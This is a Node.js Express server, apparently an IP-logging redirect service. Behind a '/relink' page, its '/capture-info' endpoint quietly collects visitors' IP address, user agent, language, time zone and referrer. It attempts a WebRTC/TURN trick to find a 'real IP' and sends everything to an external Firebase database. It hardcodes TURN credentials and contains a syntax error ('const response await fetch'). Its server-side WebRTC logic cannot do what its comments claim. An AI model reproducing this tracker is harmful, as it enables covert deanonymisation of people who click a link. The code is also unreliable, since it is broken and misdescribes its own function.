const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const wrtc = require('wrtc');

const http = require('http'); 

const https = require('https');
const fs = require('fs');

const privateKey = fs.readFileSync('/etc/letsencrypt/live/coturntest.mooo.com/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/coturntest.mooo.com/fullchain.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/coturntest.mooo.com/chain.pem', 'utf8');


const credentials = {
   key: privateKey,
   cert: certificate,
   ca: ca
};

const app = express();


app.use((req, res, next) => {
    if (!req.secure) {
        return res.redirect(301, `https://${req.headers.host}${req.originalUrl}`);
    }
    next();
});

app.use(bodyParser.json());
app.use(express.static('public'));

const iceConfiguration = {
    iceServers: [
		{
            urls: ["stuns:coturntest.mooo.com:5349"] // Ваш STUN сервер
        },
        {
            urls: ["turns:18.216.50.200:5349"], // явно вказуємо порт
            username: "Anton",
            credential: "blablabla"
        }
    ]
};

app.post('/capture-info', async (req, res) => {
	try {
	console.log('Received request on /capture-info with data:', req.body);
    const { timeZone, referrer } = req.body;
    const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const language = req.headers['accept-language'];
    let dateTime = new Date().toISOString().replace(/[^0-9]/g, "").slice(2,12);

    // Створення WebRTC з'єднання
    const pc = new wrtc.RTCPeerConnection(iceConfiguration);

    pc.onicecandidate = async (event) => {
		console.log('Received onicecandidate event:', event.candidate);
        if (event.candidate) {
            // Якщо це ваш TURN сервер, то отримана IP адреса є реальним IP користувача
            let match = /relay\sip\s([0-9.]+)/.exec(event.candidate.candidate);
            if (match) {
                let realIP = match[1];
                pc.close(); // Розриваємо з'єднання

                // Зберігаємо дані в Firebase
                const response await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ip: ipFromHeaders,
						realip: realIP,
                        userAgent: userAgent,
                        language: language,
                        timeZone: timeZone,
                        referrer: referrer
                    }),
                });
				console.log('Response from Firebase:', await response.text());
                
                res.status(200).send('Info captured');
            }
        }
    };

    pc.createDataChannel(''); 
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
	} catch (error) {
        console.error('Error in /capture-info:', error);
        res.status(500).send('Internal server error');
    }
});

app.get('/relink', (req, res) => {
    if (req.query.url) {
        res.sendFile(__dirname + '/public/redirect.html');
    } else {
        res.send('URL parameter is missing.');
    }
});

const httpsServer = https.createServer(credentials, app);

app.listen(3000, () => console.log('Server is running on port 3000'));
http.createServer(app).listen(80, () => {
    console.log(`Server is running on port ${80}`);
});
httpsServer.listen(443, () => {
    console.log('HTTPS Server running on port 443');
});